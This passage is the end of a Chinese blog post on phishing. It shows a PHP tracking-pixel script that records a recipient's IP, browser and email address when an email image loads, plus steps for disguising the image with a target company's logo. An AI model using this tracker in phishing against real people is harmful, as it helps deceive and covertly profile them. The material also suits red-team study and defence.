class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	include &quot;c/functions.php&quot;;</span><br><span class="line">	include &quot;c/db.php&quot;;</span><br><span class="line"></span><br><span class="line">	$vrfy=get_request( false, &quot;vrfy&quot;);</span><br><span class="line">	if ( $vrfy&lt;&gt;&quot;&quot; )&#123;</span><br><span class="line">		echo &quot;Vrfy OK&quot;;</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">	pub_getstatparas( $mail_id, $email, $randcode );</span><br><span class="line"></span><br><span class="line">//function pub_getstatparas( &amp;$amailid, &amp;$aemail, &amp;$arandcode )&#123;</span><br><span class="line">//    $p = get_request( false, &quot;p&quot; );</span><br><span class="line">//</span><br><span class="line">//    if  (strlen($p)&gt;0 )&#123;</span><br><span class="line">//        //解密 BASE64</span><br><span class="line">//        $p = base64_decode( $p );</span><br><span class="line">//        $paras = explode( &quot;?&quot;, $p );</span><br><span class="line">//        $npara = count( $paras )-1;</span><br><span class="line">//</span><br><span class="line">//        $arandcode=0;</span><br><span class="line">//        if ( $npara &gt;= 1 )&#123;</span><br><span class="line">//            $amailid = $paras[0];</span><br><span class="line">//            $aemail = $paras[1];</span><br><span class="line">//            if ( $npara &gt;= 2 )&#123;</span><br><span class="line">//                $arandcode = $paras[2];</span><br><span class="line">//            &#125;</span><br><span class="line">//        &#125;</span><br><span class="line">//</span><br><span class="line">//        $amailid = URLDecode( $amailid );</span><br><span class="line">//</span><br><span class="line">//        if ( ! is_numeric( $arandcode ) )</span><br><span class="line">//            $arandcode = 0;</span><br><span class="line">//</span><br><span class="line">//        //防止标识超过长度限制</span><br><span class="line">//        if ( strLen( $amailid)&gt;20 )</span><br><span class="line">//            $amailid = substr( $amailid, 0, 20 );</span><br><span class="line">//    &#125;</span><br><span class="line">//&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	$berror = false;</span><br><span class="line">	</span><br><span class="line">	//&#x27; 记录统计</span><br><span class="line">	if ( $mail_id&lt;&gt;&quot;&quot; and strlen($mail_id)&gt;0 and strpos( $email, &quot;@&quot; )&gt;1 )&#123;</span><br><span class="line">		//&#x27;读取黑白名单设置</span><br><span class="line">		$badd = get_isadd( $mail_id, $email );</span><br><span class="line">		</span><br><span class="line">		//&#x27; 需要添加记录</span><br><span class="line">		if ( $badd )&#123;</span><br><span class="line">			$cls_db = new class_database;</span><br><span class="line">			$cls_db-&gt;OpenConnect();</span><br><span class="line">			</span><br><span class="line">		    $cmd = &quot;SELECT * FROM `stat` WHERE mail_id=?;&quot;;</span><br><span class="line">            $p =  array ( $mail_id );</span><br><span class="line">		    $cls_db-&gt;getrecords( $cmd, $p, $db );</span><br><span class="line">			</span><br><span class="line">			//&#x27;添加统计记录</span><br><span class="line">			$rs = $db-&gt;fetch();</span><br><span class="line">			if ( $rs )</span><br><span class="line">			&#123;</span><br><span class="line">				$id = $rs[&quot;id&quot;];</span><br><span class="line">				$n = $rs[&quot;mail_read&quot;];</span><br><span class="line">				$n ++;</span><br><span class="line">				$n = $cls_db-&gt;execsql( &quot;UPDATE stat SET mail_read=$n WHERE id=$id&quot; );</span><br><span class="line"></span><br><span class="line">				// 判断 list 表中是否有这个地址</span><br><span class="line">				$cmd = &quot;SELECT * FROM [list] WHERE mailid=? AND email=? LIMIT 0,1;&quot;;</span><br><span class="line">				$p = array ( $id, $email );</span><br><span class="line">				$cls_db-&gt;getrecords($cmd, $p, $db2);</span><br><span class="line">				$rs2 = $db2-&gt;fetch();</span><br><span class="line">				if ( !$rs2 )</span><br><span class="line">				&#123;</span><br><span class="line">					$n = $rs[&quot;mail_read_2&quot;];</span><br><span class="line">					$n++;</span><br><span class="line">					$n = $cls_db-&gt;execsql( &quot;UPDATE stat SET mail_read_2=$n WHERE id=$id&quot; );</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				$mt = $cls_db-&gt;m_connect-&gt;prepare( &quot;INSERT INTO stat(mail_id, mail_read, mail_read_2) VALUES(?, 1, 1)&quot;);</span><br><span class="line">				$mt-&gt;execute( array( $mail_id ) );</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			// 重新获取ID</span><br><span class="line">			$cmd = &quot;SELECT * FROM `stat` WHERE mail_id=?;&quot;;</span><br><span class="line">			$p =  array ( $mail_id );</span><br><span class="line">		    $cls_db-&gt;getrecords( $cmd, $p, $db );</span><br><span class="line">			$rs = $db-&gt;fetch();</span><br><span class="line">			$id = $rs[&quot;id&quot;];</span><br><span class="line"></span><br><span class="line">			//&#x27;添加详细记录</span><br><span class="line">			try&#123;</span><br><span class="line">				//var_dump( $_SERVER );</span><br><span class="line">				$ip =  $_SERVER[&#x27;REMOTE_ADDR&#x27;];</span><br><span class="line">				$agent = $_SERVER[&quot;HTTP_USER_AGENT&quot;];	</span><br><span class="line">				$t = date(&#x27;Y-m-d H:i:s&#x27;,time());</span><br><span class="line">				</span><br><span class="line">				$mt = $cls_db-&gt;m_connect-&gt;prepare( &quot;INSERT INTO list(mailid, ip, client, email, date, randcode) VALUES(?, ?, ?, ?, ?, ? );&quot;);</span><br><span class="line">				$mt-&gt;execute( array( $id, $ip, $agent, $email, $t, $randcode) );</span><br><span class="line">			&#125;catch(PDOException $e)</span><br><span class="line">			&#123;</span><br><span class="line">				echo $e-&gt;getMessage();</span><br><span class="line">				$berror = true;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			$cls_db-&gt;CloseConnect();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	if ( ! $berror )</span><br><span class="line">	&#123;</span><br><span class="line">		header( &quot;Content-Type: image/gif&quot; );</span><br><span class="line">		readfile(&quot;images/blank.gif&quot;);</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>实现流程：</p>
<p>一、在邮件中插入一张图片，这里通过php中的readfile() 函数读取本地图片，这里的图片可以使用目标公司的logo，并写入到输出缓冲。</p>
<p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx.xx/stat.php?p=U0NDV18xMz8yMDA2QDE2My5jb20/NjI3MzY=">http://xx.xx.xx.xx.xx/stat.php?p=U0NDV18xMz8yMDA2QDE2My5jb20/NjI3MzY=</a></p>
<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597654172917-fac98e69-78da-4bcf-8d6c-4043921f4dc8.png" alt="img"></p>
<p>U0NDV18xMz8yMDA2QDE2My5jb20&#x2F;NjI3MzY&#x3D; base64加密的内容格式为：</p>
<p>邮件标识|接受邮箱|随机码</p>
<p><a href="mailto:SCCW_13?2006@163.com">SCCW_13?2006@163.com</a>?62736</p>
<p>二、当目标出网的情况下，点击邮件浏览器发出HTTP请求图片，后端处理前端发送过来的参数并进行展示。</p>
<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/1597654172921-6e5f6b3c-2a44-41c8-b154-0c7ff838f1e8.png" alt="img"></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>就说到这里～ 如果有意向可以一起交流。</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/life/">漂泊</a></li>
         
          <li><a target="_blank" rel="noopener" href="http://github.com/c1y2m3">github</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E6%9C%A8%E9%A9%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">0x01 木马思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">实现流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE"><span class="toc-number">1.0.0.1.1.</span> <span class="toc-text">一、资源释放</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E9%9A%90%E8%94%BD"><span class="toc-number">1.0.0.1.2.</span> <span class="toc-text">二、文件隐蔽</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.0.0.1.3.</span> <span class="toc-text">三、创建进程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4"><span class="toc-number">1.0.0.1.4.</span> <span class="toc-text">四、痕迹清除</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%88%E6%9E%9C%E6%BC%94%E7%A4%BA"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">效果演示</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%B1%BC%E7%AB%BF%E6%84%9F%E7%9F%A5"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">鱼竿感知</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">2.</span> <span class="toc-text">结语</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/&text=钓鱼攻击-邮件马的制作"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/&title=钓鱼攻击-邮件马的制作"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/&is_video=false&description=钓鱼攻击-邮件马的制作"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=钓鱼攻击-邮件马的制作&body=Check out this article: https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/&title=钓鱼攻击-邮件马的制作"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/&title=钓鱼攻击-邮件马的制作"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/&title=钓鱼攻击-邮件马的制作"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/&title=钓鱼攻击-邮件马的制作"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/&name=钓鱼攻击-邮件马的制作&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://c1y2m3.github.io/2020/07/09/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB-%E9%82%AE%E4%BB%B6%E9%A9%AC%E7%9A%84%E5%88%B6%E4%BD%9C/&t=钓鱼攻击-邮件马的制作"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    John Doe
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/life/">漂泊</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/c1y2m3">github</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
